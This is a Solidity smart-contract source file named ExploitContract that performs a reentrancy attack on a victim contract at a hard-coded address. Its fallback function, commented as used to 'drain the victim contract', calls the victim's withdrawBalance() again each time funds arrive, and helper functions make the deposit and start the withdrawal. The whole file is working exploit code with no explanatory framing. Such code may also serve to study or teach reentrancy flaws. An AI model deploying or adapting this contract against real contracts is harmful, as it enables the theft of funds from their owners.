pragma solidity ^0.4.11;

contract ExploitContract {
    address victim_address  = 0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd;

    function ExploitContract() public payable {}

    // Default function - used to drain the victim contract
    function () payable {
        victim_address.call(bytes4(keccak256("withdrawBalance()")));
    }

    function addToBalance() public payable returns(bool) {
        return victim_address.call.value(1)(bytes4(keccak256("addToBalance()")));
    }

    function withdrawBalance() public payable returns(bool) {
        return victim_address.call(bytes4(keccak256("withdrawBalance()")));
    }

    function getContractBalance() public returns(uint256) {
        return this.balance;
    }
}
